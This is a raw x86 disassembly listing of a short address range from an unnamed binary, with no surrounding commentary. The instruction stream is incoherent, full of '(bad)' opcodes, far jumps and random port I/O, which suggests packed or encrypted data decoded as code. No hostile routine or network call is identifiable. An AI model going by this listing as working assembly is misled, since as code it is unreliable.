  409993:	fdiv   QWORD PTR [ecx-0x45ee8b1]
  409999:	out    0x17,eax
  40999b:	jmp    0x5319:0x7f90858c
  4099a2:	clc    
  4099a3:	cdq    
  4099a4:	push   ebx
  4099a5:	jo     0x409983
  4099a7:	in     eax,dx
  4099a8:	and    BYTE PTR [esi-0x7ef2e6d2],bl
  4099ae:	jno    0x4099b1
  4099b0:	(bad)  
  4099b1:	in     al,dx
  4099b2:	inc    edx
  4099b3:	pusha  
  4099b4:	inc    esi
  4099b5:	enter  0x6b9f,0x9
  4099b9:	rcr    edx,1
  4099bb:	mov    esp,0x43bf493f
  4099c0:	push   ebp
  4099c1:	sub    dh,BYTE PTR [eax+0x21929e9b]
  4099c7:	ins    DWORD PTR es:[edi],dx
  4099c8:	sbb    al,0x5
  4099ca:	inc    esi
  4099cb:	jb     0x409962
  4099cd:	das    
  4099ce:	ds inc esi
  4099d0:	je     0x40998e
  4099d2:	sbb    BYTE PTR [edx-0x4],cl
  4099d5:	loopne 0x4099aa
  4099d7:	and    BYTE PTR [esp+edx*2+0x50],0x5
  4099dc:	das    
  4099dd:	dec    eax
  4099de:	mov    edi,0x33d256c
  4099e3:	push   edi
  4099e4:	pushf  
  4099e5:	jmp    0x4099ce
  4099e7:	mov    edi,DWORD PTR [edx-0x48]
  4099ea:	inc    ebx
  4099eb:	push   esp
  4099ec:	mov    ebx,DWORD PTR [ebx]
  4099ee:	push   0x9bedeafa
  4099f3:	push   esp
  4099f4:	jmp    0x1cc9:0x7f040f55
  4099fb:	or     ecx,DWORD PTR [edx+0x377ba40b]
  409a01:	xor    dl,BYTE PTR [edx+0x351dd5bf]
  409a07:	enter  0xa6da,0xd0
  409a0b:	test   DWORD PTR [esi-0x3c],esp
  409a0e:	mov    cs,WORD PTR [edx]
  409a10:	mov    BYTE PTR [esp+eiz*8+0x3404b89e],dl
  409a17:	dec    esp
  409a18:	bsf    ecx,DWORD PTR [ecx+0x21]
  409a1c:	mov    dh,0xdd
  409a1e:	mul    BYTE PTR [edx]
  409a20:	xor    eax,0x553c3fc5
  409a25:	cwde   
  409a26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409a27:	push   0x4c01b857
  409a2c:	test   eax,0x48d88cd3
  409a31:	lock mov BYTE PTR [edi+esi*1],dh
  409a35:	je     0x409aab
  409a37:	add    BYTE PTR [ebx],al
  409a39:	mov    edx,0xb04ad47b
  409a3e:	mov    esi,0x16ad6d80
  409a43:	test   DWORD PTR [edi+0x43b346e7],esi
  409a49:	mov    gs,WORD PTR [esi-0x5275b472]
  409a4f:	clc    
  409a50:	adc    bl,BYTE PTR [edx+eax*4]
  409a53:	in     eax,dx
  409a54:	xor    eax,0xf2c43da3
  409a59:	scas   eax,DWORD PTR es:[edi]
  409a5a:	fcmovu st,st(1)
  409a5c:	int    0xf4
  409a5e:	add    al,0x12
  409a60:	mov    esi,0x97cef369
  409a65:	mov    dh,0x74
  409a67:	xchg   BYTE PTR [esi+0x7a5b91c4],al
  409a6d:	sub    DWORD PTR [ebp-0x72810504],0xffffffd5
  409a74:	packuswb mm2,mm7
  409a77:	sbb    eax,0x98e21406
  409a7c:	adc    al,0x1
  409a7e:	push   ecx
  409a7f:	dec    esi
  409a80:	inc    edx
  409a81:	jg     0x409ab5
  409a83:	sub    edi,DWORD PTR [eax-0x294e46a9]
  409a89:	test   eax,0xeeb30c9e
  409a8e:	stos   DWORD PTR es:[edi],eax
  409a8f:	xor    ecx,DWORD PTR [esi-0x18]
  409a92:	in     eax,0xa
  409a94:	mov    cs,esp
  409a96:	jmp    0x99a28ca0
  409a9b:	sub    edx,DWORD PTR ds:0x1d5e6857
  409aa1:	push   ds
  409aa2:	and    cl,BYTE PTR [esp+ebx*1+0x1]
  409aa6:	adc    ebp,ebx
  409aa8:	pop    ebp
  409aa9:	int3   
  409aaa:	push   eax
  409aab:	mov    ds:0x398f5545,al
  409ab0:	mov    al,0x6e
  409ab2:	rcr    BYTE PTR [edi+0x7f2a275e],1
  409ab8:	cmp    eax,0x5194861f
  409abd:	ins    BYTE PTR es:[edi],dx
  409abe:	inc    esi
  409abf:	inc    DWORD PTR [ebx+0x63]
  409ac2:	mov    dh,0x4d
  409ac4:	das    
  409ac5:	fist   WORD PTR [ecx]
  409ac7:	adc    al,0x3c
  409ac9:	jbe    0x409abf
  409acb:	cmp    BYTE PTR [esi+esi*4+0x457eb58],dh
  409ad2:	mov    bh,dh
  409ad4:	or     BYTE PTR [edx+esi*1-0x23a42afe],dh
  409adb:	cmc    
  409adc:	xchg   edx,eax
  409add:	fnsave [edi-0x41051bb7]
  409ae3:	add    BYTE PTR [ecx+0x4592ebb8],bh
  409ae9:	mov    eax,ds:0xac11719e
  409aee:	aas    
  409aef:	jmp    0x9768:0x57e9e40c
  409af6:	std    
  409af7:	push   ss
  409af8:	sbb    ebp,DWORD PTR [ebx]
  409afa:	into   
  409afb:	je     0x409b5e
  409afd:	cmp    BYTE PTR [ecx+0x1cf46696],bh
  409b03:	repz jns 0x409b35
  409b06:	mov    ds:0xae129ec0,eax
  409b0b:	pop    edx
  409b0c:	retf   0x63db
  409b0f:	retf   
  409b10:	pop    ebx
  409b11:	xchg   ecx,eax
  409b12:	fadd   DWORD PTR [ecx]
  409b14:	sub    al,0x43
  409b16:	inc    edi
  409b17:	mov    ds:0x50274291,eax
  409b1c:	mov    ch,cl
  409b1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409b1f:	inc    edi
  409b20:	mov    dh,0xdc
  409b22:	jnp    0x409ade
  409b24:	or     eax,0xf86730ad
  409b29:	es not ecx
  409b2c:	or     ebp,eax
  409b2e:	loope  0x409acd
  409b30:	popf   
  409b31:	(bad)  
  409b32:	xchg   ebx,eax
  409b33:	ret    0x6141
  409b36:	mov    eax,cs
  409b38:	mov    bh,0x5f
  409b3a:	test   BYTE PTR [esp+ebp*8],bh
  409b3d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409b3e:	outs   dx,DWORD PTR ds:[esi]
  409b3f:	rol    DWORD PTR [edx-0x46],1
  409b42:	and    al,0xc7
  409b44:	mov    dh,0x86
  409b46:	fsubr  DWORD PTR [edx-0x3e]
  409b49:	mov    al,ds:0xfed2be04
  409b4e:	add    eax,0xb4d51305
  409b53:	fldcw  WORD PTR [ebp+0x1aaab436]
  409b59:	out    0xcc,eax
  409b5b:	ins    BYTE PTR es:[edi],dx
  409b5c:	jge    0x409b16
  409b5e:	inc    ebp
  409b5f:	sahf   
  409b60:	jp     0x409bbb
  409b62:	out    0x8a,al
  409b64:	jge    0x409baf
  409b66:	sbb    al,0xe0
  409b68:	in     eax,0x29
  409b6a:	mov    ch,0x99
  409b6c:	aas    
  409b6d:	mov    fs,edx
  409b6f:	test   eax,ecx
  409b71:	add    al,0x52
  409b73:	pop    esi
  409b74:	mov    ebp,0xec61c548
  409b79:	xchg   ebx,eax
  409b7a:	xchg   edi,eax
  409b7b:	inc    esp
  409b7c:	xlat   BYTE PTR ds:[ebx]
  409b7d:	push   es
  409b7e:	mov    dl,0x58
  409b80:	xchg   DWORD PTR [ebp-0x107d2beb],eax
  409b86:	cmc    
  409b87:	add    al,0xd8
  409b89:	gs je  0x409b8f
  409b8c:	fild   WORD PTR [eax-0x6b]
  409b8f:	loop   0x409b72
  409b91:	std    
  409b92:	push   ecx
  409b93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409b94:	add    al,BYTE PTR [edi+edx*2+0x36]
  409b98:	or     BYTE PTR [esp+ecx*1+0x57],bl
  409b9c:	ss stos DWORD PTR es:[edi],eax
  409b9e:	dec    BYTE PTR [edi+0x622643df]
  409ba4:	cmp    eax,0xc4d853ac
  409ba9:	sahf   
  409baa:	(bad)  
  409bab:	mov    WORD PTR [edi-0x144f8174],?
  409bb1:	cwde   
  409bb2:	xchg   edi,eax
  409bb3:	call   0xab93b9cf
  409bb8:	test   eax,0x3592483e
  409bbd:	mov    BYTE PTR [edi],bl
  409bbf:	xchg   esp,eax
  409bc0:	mov    es,WORD PTR ds:0x8a9c86f4
  409bc6:	mul    edi
  409bc8:	dec    ebp
  409bc9:	mov    edx,0x7f597844
  409bce:	push   edx
  409bcf:	cld    
  409bd0:	data16 fcom QWORD PTR [ebx-0x6591eafc]
  409bd7:	add    DWORD PTR [ebp-0x43f0ef3d],0xffffffd3
  409bde:	cmp    BYTE PTR [edx-0x5dfed8aa],cl
  409be4:	imul   ecx,DWORD PTR [ecx],0x2b5f9630
  409bea:	and    ebp,0x22e9e817
  409bf0:	add    edx,ebp
  409bf2:	ret    
  409bf3:	jp     0x409b88
  409bf5:	pop    edx
  409bf6:	cmp    cl,BYTE PTR [eax+0x4c]
  409bf9:	lahf   
  409bfa:	pop    ebx
  409bfb:	dec    ebx
  409bfc:	in     al,dx
  409bfd:	mov    bl,0xc2
  409bff:	(bad)  
  409c00:	jmp    0x84d24406
  409c05:	ret    
  409c06:	sub    ecx,ecx
  409c08:	ins    BYTE PTR es:[edi],dx
  409c09:	leave  
  409c0a:	ror    BYTE PTR [eax],1
  409c0c:	mov    eax,0x24eb5e89
  409c11:	fs cmc 
  409c13:	inc    edi
  409c14:	xor    esp,ebp
  409c16:	pushf  
  409c17:	fld    TBYTE PTR [ecx]
  409c19:	test   BYTE PTR [eax+esi*2],dh
  409c1c:	call   0xc772:0x4c80399c
  409c23:	cli    
  409c24:	bnd jnp 0x409bf7
  409c27:	adc    eax,ecx
  409c29:	pusha  
  409c2a:	push   cs
  409c2b:	out    0xb,al
  409c2d:	int    0x79
  409c2f:	jno    0x409c98
  409c31:	(bad)  
  409c32:	mov    dh,0x36
  409c34:	(bad)  
  409c36:	call   0x83cc:0x3777f783
  409c3d:	push   0x10ed2061
  409c42:	or     al,0xec
  409c44:	lods   eax,DWORD PTR ds:[esi]
  409c45:	add    eax,0x999be28a
  409c4a:	xor    eax,0x7d4c8f11
  409c4f:	out    dx,al
  409c50:	and    bl,BYTE PTR [ebx]
  409c52:	inc    DWORD PTR [edi-0x52efe31f]
  409c58:	nop
  409c59:	jmp    0x5869c1e0
  409c5e:	test   al,0xbc
  409c60:	xor    BYTE PTR [ecx+0x72],0x6c
  409c64:	inc    esp
  409c65:	jmp    0x8d6b:0xb87d0962
  409c6c:	ret    0x8866
  409c6f:	aad    0x4c
  409c71:	pushf  
  409c72:	imul   esp,ecx,0xabe2c88e
  409c78:	fs in  eax,0x6d
  409c7b:	mov    WORD PTR [ebx],?
  409c7d:	test   al,0x19
  409c7f:	sbb    eax,0x71422211
  409c84:	mov    edi,0x4963ba5b
  409c89:	pop    ecx
  409c8a:	or     bl,dl
  409c8c:	xor    BYTE PTR [ecx+edx*8],ah
  409c8f:	inc    esp
  409c90:	sub    al,0x7d
  409c92:	mov    dh,0xf8
  409c94:	(bad)  
  409c95:	fdiv   DWORD PTR [edx-0x71fa472d]
  409c9b:	jne    0x409c8a
  409c9d:	and    al,0x1f
  409c9f:	adc    ebx,DWORD PTR [edi-0x6c]
  409ca2:	jmp    0x66c:0x853329cb
  409ca9:	mov    WORD PTR [ebx+eax*2+0x56],ss
  409cad:	mov    ch,0x23
  409caf:	(bad)  
  409cb0:	popf   
  409cb1:	adc    BYTE PTR [ecx+0x1b40da48],0xe5
  409cb8:	dec    ecx
  409cb9:	sub    esp,DWORD PTR [esi-0x35dbff82]
  409cbf:	push   esi
  409cc0:	sahf   
  409cc1:	clc    
  409cc2:	sub    ch,BYTE PTR [ebx-0x2c38914f]
  409cc8:	sbb    eax,0xb10539e5
  409ccd:	mov    edx,DWORD PTR [edx-0x5a]
  409cd0:	xor    DWORD PTR [edx+0x6c],esi
  409cd3:	or     eax,0xae685df8
  409cd8:	in     al,0x57
  409cda:	jae    0x409c9d
  409cdc:	out    dx,al
  409cdd:	adc    cl,BYTE PTR [ecx+0x183c7516]
  409ce3:	mov    dl,0x1f
  409ce5:	inc    esi
  409ce6:	mov    ebp,0x90c7ebb7
  409ceb:	fs dec ecx
  409ced:	cmp    al,dl
  409cef:	aaa    
  409cf0:	xlat   BYTE PTR ds:[ebx]
  409cf1:	inc    ecx
  409cf2:	and    ah,0xe
  409cf5:	out    0x47,al
  409cf7:	add    edx,DWORD PTR [ebx+0x41834847]
  409cfd:	cmp    ebx,DWORD PTR [esi]
  409cff:	pop    ebx
  409d00:	cli    
  409d01:	mov    BYTE PTR [esi-0x5c],bh
  409d04:	or     al,0x79
  409d06:	repz (bad) 
  409d08:	cdq    
  409d09:	sub    edx,DWORD PTR [ebp-0x59]
  409d0c:	test   DWORD PTR [ebp-0x58],edi
  409d0f:	add    eax,esp
  409d11:	and    al,0xa4
  409d13:	mov    edi,0x401fe293
  409d18:	sub    BYTE PTR [ecx+0x0],al
  409d1b:	stos   BYTE PTR es:[edi],al
  409d1c:	popa   
  409d1d:	adc    ebx,eax
  409d1f:	and    dl,BYTE PTR [edx]
  409d21:	pop    edx
  409d22:	or     BYTE PTR ds:0x6240309,al
  409d28:	dec    edi
  409d29:	jno    0x409d2e
  409d2b:	sahf   
  409d2c:	mov    al,ds:0xe5aa3335
  409d31:	push   eax
  409d32:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409d33:	daa    
  409d34:	rcr    DWORD PTR [esi+ecx*8-0xd],cl
  409d38:	sub    dh,BYTE PTR [edx-0x42]
  409d3b:	add    DWORD PTR [eax],esi
  409d3d:	push   es
  409d3e:	jp     0x409cd0
  409d40:	dec    ebx
  409d41:	jbe    0x409ceb
  409d43:	aas    
  409d44:	pop    es
  409d45:	mov    esi,0xb823e6a9
  409d4a:	mov    ebx,0x7a3f4716
  409d4f:	mov    ebp,0xcbc415a
  409d54:	jae    0x409d43
  409d56:	and    DWORD PTR [edi],esi
  409d58:	push   cs
  409d59:	mov    cl,0x49
  409d5b:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  409d5d:	xlat   BYTE PTR ds:[ebx]
  409d5e:	fwait
  409d5f:	sbb    dh,bl
  409d61:	mov    bl,0xdd
  409d63:	sbb    al,0x9f
  409d65:	push   edi
  409d66:	adc    eax,0x4d35be7c
  409d6b:	mov    ecx,0xd7778e78
  409d70:	push   ss
  409d71:	jo     0x409d99
  409d73:	xchg   ebp,eax
  409d74:	ret    
  409d75:	and    eax,0x26ac6f18
  409d7a:	and    ah,bh
  409d7c:	pop    ebx
  409d7d:	addr16 push esi
  409d7f:	jle    0x409db3
  409d81:	out    dx,al
  409d82:	mov    dh,0x73
  409d84:	mov    al,ds:0x994f1887
  409d89:	jle    0x409d80
  409d8b:	inc    eax
  409d8c:	adc    al,0x7f
  409d8e:	mov    ds:0xae4d04b2,eax
  409d93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409d94:	xor    bh,ch
  409d96:	xor    ebx,DWORD PTR [edi]
  409d98:	arpl   si,ax
  409d9a:	adc    al,0x25
  409d9c:	push   ebx
  409d9d:	cdq    
  409d9e:	retf   
  409d9f:	xchg   edi,eax
  409da0:	jecxz  0x409d3b
  409da2:	adc    eax,0x2ab24952
  409da7:	push   cs
  409da8:	fucomip st,st(6)
  409daa:	or     esi,ebp
  409dac:	inc    esi
  409dad:	dec    edx
  409dae:	push   ebp
  409daf:	mov    dl,0xf4
  409db1:	mov    WORD PTR ds:0x8d73e53b,cs
  409db7:	sbb    bh,bh
  409db9:	cli    
  409dba:	xchg   ecx,eax
  409dbb:	pop    eax
  409dbc:	fld    QWORD PTR [eax]
  409dbe:	dec    edx
  409dbf:	jecxz  0x409df1
  409dc1:	push   ss
  409dc2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409dc3:	in     eax,dx
  409dc4:	xor    BYTE PTR [ebx],bl
  409dc6:	mov    eax,ds:0xca965c3d
  409dcb:	xor    BYTE PTR [eax],cl
  409dcd:	lds    esp,FWORD PTR [esi+0x1f]
  409dd0:	shr    DWORD PTR [eax+ebx*1],1
  409dd3:	inc    edx
  409dd4:	jne    0x409db4
  409dd6:	pop    esp
  409dd7:	out    0x7f,eax
  409dd9:	out    0x83,eax
  409ddb:	jp     0x409d92
  409ddd:	adc    dh,bh
  409ddf:	mov    al,ds:0x4812bed
  409de4:	pop    edx
  409de5:	push   ebp
  409de6:	sti    
  409de7:	dec    eax
  409de8:	inc    eax
  409de9:	fcmovnb st,st(0)
  409deb:	inc    eax
  409dec:	mov    esi,DWORD PTR [esi+0x1420918f]
  409df2:	push   ebx
  409df3:	or     edx,DWORD PTR [edi-0x28]
  409df6:	or     eax,DWORD PTR [esi-0x6b4a4d7e]
  409dfc:	mov    bh,0x71
  409dfe:	mov    esp,0x8f2ef0ec
  409e03:	leave  
  409e04:	mov    gs:0x6c904124,eax
  409e0a:	dec    ecx
  409e0b:	in     al,0x5a
  409e0d:	pop    esi
  409e0e:	jbe    0x409e7f
  409e10:	ret    0xd3a6
  409e13:	fimul  DWORD PTR [eax+0x6a]
  409e16:	fdivp  st(6),st
  409e18:	cmp    eax,0x2858f06b
  409e1d:	enter  0x8ebe,0x77
  409e21:	je     0x409da6
  409e23:	repz xchg edi,eax
  409e25:	popf   
  409e26:	xor    edi,DWORD PTR [ecx+ecx*8-0x41]
  409e2a:	jmp    0x3855feb2
  409e2f:	and    al,0x3
  409e31:	push   edx
  409e32:	fs iret 
  409e34:	mov    WORD PTR ss:[edi-0x78],?
  409e38:	sub    al,0x5c
  409e3a:	jmp    0x5d99:0x9a980253
  409e41:	bnd jge 0x409de9
  409e44:	mov    esi,0x1c7ef239
  409e49:	rol    dl,0x5c
  409e4c:	add    dl,0xbf
  409e4f:	lea    edx,[ebx+0x3406e7d8]
  409e55:	push   ecx
  409e56:	jecxz  0x409ebf
  409e58:	jne    0x409df9
  409e5a:	mov    ah,0x6f
  409e5c:	pusha  
  409e5d:	xor    al,BYTE PTR [ebx+ebp*1-0x18]
  409e61:	ror    BYTE PTR [ebp+0x1d],1
  409e64:	popf   
  409e65:	inc    edx
  409e66:	sbb    DWORD PTR [ebp+0x33],edx
  409e69:	inc    esp
  409e6a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409e6b:	dec    edx
  409e6c:	pop    ss
  409e6d:	xlat   BYTE PTR ds:[ebx]
  409e6e:	icebp  
  409e6f:	dec    ebp
  409e70:	xor    eax,DWORD PTR [esi-0x5b]
  409e73:	sbb    BYTE PTR [esi-0x4e34ed1],0xc0
  409e7a:	sub    BYTE PTR [ebp+0x53],cl
  409e7d:	ret    0x7c
  409e80:	fst    QWORD PTR [ecx+0x25bc1b18]
  409e86:	ret    0x571b
  409e89:	(bad)  
  409e8a:	ss sahf 
  409e8c:	imul   edx,DWORD PTR [ecx+0x4e],0x34
  409e90:	jae    0x409ecd
  409e92:	fistp  WORD PTR [esi+ebx*1]
  409e95:	cmp    al,0x57
  409e97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409e98:	push   esi
  409e99:	adc    DWORD PTR [ebp+0x39],esi
  409e9c:	popf   
  409e9d:	adc    ebx,DWORD PTR [ebp-0x447012c1]
  409ea3:	ficomp DWORD PTR [edi]
  409ea5:	scas   al,BYTE PTR es:[edi]
  409ea6:	or     DWORD PTR [esp+ecx*2-0x57350c7b],ebx
  409ead:	pop    ebp
  409eae:	sub    eax,0x869dd9bd
  409eb3:	push   es
  409eb4:	push   cs
  409eb5:	(bad)  
  409eb6:	lods   al,BYTE PTR ds:[esi]
  409eb7:	xor    dh,ah
  409eb9:	lods   al,BYTE PTR ds:[esi]
  409eba:	int    0x98
  409ebc:	mov    ds:0xd7a0c340,eax
  409ec1:	sbb    al,0xda
  409ec3:	fistp  QWORD PTR [ebx+0x46969516]
  409ec9:	xchg   edx,eax
  409eca:	and    bl,BYTE PTR [edx+0x44]
  409ecd:	push   0xffffffb8
  409ecf:	xor    ebx,DWORD PTR [edx+0x23]
  409ed2:	cwde   
  409ed3:	fwait
  409ed4:	sub    BYTE PTR [edi-0x65],0xe3
  409ed8:	lods   al,BYTE PTR ds:[esi]
  409ed9:	xor    DWORD PTR [edx],eax
  409edb:	adc    BYTE PTR [eax-0x77],bh
  409ede:	mov    al,0xb7
  409ee0:	cld    
  409ee1:	mov    edi,0xdea0b7c5
  409ee6:	dec    esp
  409ee7:	pop    ebp
  409ee8:	out    0x18,al
  409eea:	popf   
  409eeb:	gs fdivrp st(7),st
  409eee:	stos   BYTE PTR es:[edi],al
  409eef:	pop    es
  409ef0:	xor    cl,BYTE PTR [esi]
  409ef2:	or     dh,bh
  409ef4:	mov    BYTE PTR [ebp+0x63419653],bh
  409efa:	cld    
  409efb:	mov    ebx,0x32084241
  409f00:	mov    ds:0xfffaf7a0,al
  409f05:	and    al,0xc0
  409f07:	call   0xa8256429
  409f0c:	aaa    
  409f0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409f0e:	push   esi
  409f0f:	cmp    DWORD PTR [ecx],ebp
  409f11:	mov    BYTE PTR [ecx],0x5a
  409f14:	sti    
  409f15:	dec    ebp
  409f16:	cmp    esi,DWORD PTR [edx+eiz*1+0x4b]
  409f1a:	pop    esi
  409f1b:	add    al,0x37
  409f1d:	add    DWORD PTR [edi+0x2330fedd],esi
  409f23:	(bad)  
  409f24:	pop    ss
  409f25:	sbb    eax,0x1540c4d3
  409f2a:	bound  eax,QWORD PTR ds:0x85e2b5
  409f30:	pop    eax
  409f31:	mov    al,0xd3
  409f33:	mov    esi,esp
  409f35:	jb     0x409f5f
  409f37:	pop    ebp
  409f38:	mov    DWORD PTR [ebp-0x76a8fb9],0xe5f1430f
  409f42:	mov    eax,ds:0x8771d522
  409f47:	stos   BYTE PTR es:[edi],al
  409f48:	ss in  al,dx
  409f4a:	pushf  
  409f4b:	daa    
  409f4c:	je     0x409f68
  409f4e:	ja     0x409f7e
  409f50:	add    esi,ebx
  409f52:	fistp  DWORD PTR [eax]
  409f54:	add    bl,BYTE PTR [edx-0x12]
  409f57:	xchg   ecx,eax
  409f58:	gs mov ah,0x89
  409f5b:	outs   dx,DWORD PTR ds:[esi]
  409f5c:	pop    eax
  409f5d:	push   cs
  409f5e:	das    
  409f5f:	call   0x5d709e20
  409f64:	cmp    bh,BYTE PTR [eax+ecx*2]
  409f67:	jns    0x409f1d
  409f69:	xor    bh,dl
  409f6b:	dec    ebx
  409f6c:	xchg   DWORD PTR [eax-0x16],eax
  409f6f:	cmp    ch,al
  409f71:	loope  0x409f6d
  409f73:	cmc    
  409f74:	int3   
  409f75:	sub    bh,BYTE PTR [esi-0x796b2a42]
  409f7b:	outs   dx,BYTE PTR ds:[esi]
  409f7c:	jmp    0x409ff3
  409f7e:	loopne 0x409fcf
  409f80:	pop    ebp
  409f81:	enter  0x4114,0xbb
  409f85:	clc    
  409f86:	pop    edi
  409f87:	mov    DWORD PTR [edi+0x71],esp
  409f8a:	mov    ds:0x9af4f907,eax
  409f8f:	inc    DWORD PTR [ebp+0xa]
  409f92:	add    al,0x50
  409f94:	jne    0x40a002
  409f96:	pop    ss
  409f97:	mov    eax,ds:0x79060574
  409f9c:	sar    BYTE PTR [esi-0x36],cl
  409f9f:	and    BYTE PTR [eax],bl
  409fa1:	sbb    ebx,DWORD PTR [edi-0x67]
  409fa4:	inc    ebp
  409fa5:	mov    ah,0xda
  409fa7:	out    dx,al
  409fa8:	pop    ebp
  409fa9:	mov    bh,0x32
  409fab:	xchg   esp,eax
  409fac:	outs   dx,DWORD PTR ds:[esi]
  409fad:	cwde   
  409fae:	loopne 0x40a020
  409fb0:	pop    ebx
  409fb1:	xor    ch,ah
  409fb3:	enter  0x1f8e,0x5e
  409fb7:	test   eax,0x12ad1554
  409fbc:	and    DWORD PTR [edx],esi
  409fbe:	inc    esp
  409fbf:	mov    ch,BYTE PTR [ebp+ecx*8-0x1]
  409fc3:	dec    esp
  409fc4:	sub    esi,esp
  409fc6:	lahf   
  409fc7:	shr    BYTE PTR [edx-0x29c8b03f],cl
  409fcd:	and    eax,0x54b2b459
  409fd2:	and    ebp,edi
  409fd4:	je     0x409f66
  409fd6:	fdiv   st(6),st
  409fd8:	sub    eax,0xb612ed59
  409fdd:	xchg   ebp,eax
  409fde:	bound  eax,QWORD PTR [ecx+0x54]
  409fe1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409fe2:	mov    al,ds:0xa88eeff6
  409fe7:	aas    
  409fe8:	rol    ch,0x3f
  409feb:	dec    ebp
  409fec:	jne    0x40a006
  409fee:	sub    al,0x85
  409ff0:	jne    0x409fa5
  409ff2:	call   0xc13ae684
  409ff7:	sbb    eax,0x4c2f0c55
  409ffc:	dec    ebx
  409ffd:	jmp    0x4799089e
  40a002:	xcrypt-ecb (bad)
  40a003:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a004:	(bad)  
  40a005:	mov    ds:0xb3e0e558,eax
  40a00a:	dec    esp
  40a00b:	cmp    al,0x4
  40a00d:	cmc    
  40a00e:	dec    esi
  40a00f:	inc    esp
  40a010:	out    dx,eax
  40a011:	jb     0x40a05f
  40a013:	dec    ebx
  40a014:	xlat   BYTE PTR ds:[ebx]
  40a015:	popa   
  40a016:	ret    
  40a017:	xlat   BYTE PTR ds:[ebx]
  40a018:	popa   
  40a019:	jl     0x40a085
  40a01b:	cmp    al,0xbd
  40a01d:	scas   al,BYTE PTR es:[edi]
  40a01e:	ins    DWORD PTR es:[edi],dx
  40a01f:	adc    edi,edi
  40a021:	xchg   edx,eax
  40a022:	cmp    dl,al
  40a024:	nop
  40a025:	leave  
  40a026:	xor    BYTE PTR [edx+0x449ae028],dl
  40a02c:	das    
  40a02d:	xor    DWORD PTR [edx-0x4],ebp
  40a030:	xor    BYTE PTR [esi],ch
  40a032:	mov    edx,0x83c7f691
  40a037:	mov    ebp,esi
  40a039:	ins    BYTE PTR es:[edi],dx
  40a03a:	push   ecx
  40a03b:	fisub  WORD PTR [ecx+0x3e64ebcc]
  40a041:	mov    eax,ds:0x31d58498
  40a046:	push   edi
  40a047:	lods   eax,DWORD PTR ds:[esi]
  40a048:	aad    0xc1
  40a04a:	sbb    eax,0xd6b5f5b
  40a04f:	test   al,0x8
  40a051:	dec    ebp
  40a052:	push   ebp
  40a053:	pop    ebp
  40a054:	in     al,dx
  40a055:	inc    esp
  40a056:	shl    bh,0x63
  40a059:	pop    ebp
  40a05a:	inc    esi
  40a05b:	add    DWORD PTR cs:[ecx+0x1904877f],esp
  40a062:	iret   
  40a063:	(bad)  
  40a064:	clc    
  40a065:	ds loope 0x40a013
  40a068:	sti    
  40a069:	pushf  
  40a06a:	aad    0x7d
  40a06c:	in     al,0xd1
  40a06e:	mov    dl,0xaf
  40a070:	retf   0xa448
  40a073:	push   es
  40a074:	push   esi
  40a075:	jbe    0x409ffa
  40a077:	lods   eax,DWORD PTR ds:[esi]
  40a078:	pop    esi
  40a079:	dec    edx
  40a07a:	push   esi
  40a07b:	push   ds
  40a07c:	sbb    dh,ch
  40a07e:	jae    0x40a090
  40a080:	jmp    0x40a058
  40a082:	popf   
  40a083:	mov    ebx,0x25bb8414
  40a088:	mul    dl
  40a08a:	rcl    DWORD PTR [ecx-0x1afa8d28],1
  40a090:	pushf  
  40a091:	dec    ebp
  40a092:	pop    esi
  40a093:	sbb    ebp,DWORD PTR [edx-0x3d]
  40a096:	sbb    eax,0x33d08f46
  40a09b:	xchg   BYTE PTR [esi+eiz*8],ch
  40a09e:	mov    BYTE PTR [esi],cl
  40a0a0:	adc    esp,esi
  40a0a2:	jb     0x40a05a
  40a0a4:	push   edx
  40a0a5:	loop   0x40a086
  40a0a7:	sahf   
  40a0a8:	pop    ecx
  40a0a9:	std    
  40a0aa:	call   0x1a0ca5a0
  40a0af:	(bad)  
  40a0b0:	fcomp  st(0)
  40a0b2:	xchg   ecx,eax
  40a0b3:	adc    eax,0x1b8b4fc5
  40a0b8:	addr16 jmp 0x2f414959
  40a0be:	and    edx,DWORD PTR [esi-0x174353dd]
  40a0c4:	mov    ch,0x4d
  40a0c6:	fstp   TBYTE PTR [edi-0x731de085]
  40a0cc:	ins    BYTE PTR es:[edi],dx
  40a0cd:	pop    edx
  40a0ce:	inc    eax
  40a0cf:	inc    edi
  40a0d0:	test   DWORD PTR [ebx],ecx
  40a0d2:	mov    al,0xc6
  40a0d4:	xor    BYTE PTR [eax],ah
  40a0d6:	or     DWORD PTR [ecx+ebx*2+0x5d],0x71
  40a0db:	jg     0x40a078
  40a0dd:	add    bh,dh
  40a0df:	test   BYTE PTR [esi],dh
  40a0e1:	mov    edi,0x83fce
  40a0e6:	ss pop ecx
  40a0e8:	mov    BYTE PTR [edi],ch
  40a0ea:	dec    esp
  40a0eb:	xor    cl,BYTE PTR [edx+eax*4]
  40a0ee:	sub    bh,BYTE PTR [edx]
  40a0f0:	mov    edx,0x1cd1fc10
  40a0f5:	cld    
  40a0f6:	mov    dh,0x11
  40a0f8:	jb     0x40a16f
  40a0fa:	jl     0x40a101
  40a0fc:	repz jl 0x40a0b9
  40a0ff:	jno    0x40a0ba
  40a101:	add    esi,ecx
  40a103:	test   eax,0xc953378a
  40a108:	scas   eax,DWORD PTR es:[edi]
  40a109:	cdq    
  40a10a:	rol    bh,0xda
  40a10d:	push   edx
  40a10e:	scas   eax,DWORD PTR es:[edi]
  40a10f:	xor    DWORD PTR [edi+0x60],edx
  40a112:	(bad)  
  40a113:	pop    eax
  40a114:	jmp    FWORD PTR [edx+0x32b4877c]
  40a11a:	fadd   QWORD PTR [esi-0x49038d11]
  40a120:	lods   al,BYTE PTR ds:[esi]
  40a121:	xchg   edx,eax
  40a122:	aad    0x1f
  40a124:	(bad)  
  40a125:	nop
  40a126:	add    ah,BYTE PTR [ebx+0x6a0fa0cb]
  40a12c:	stc    
  40a12d:	pop    eax
  40a12e:	into   
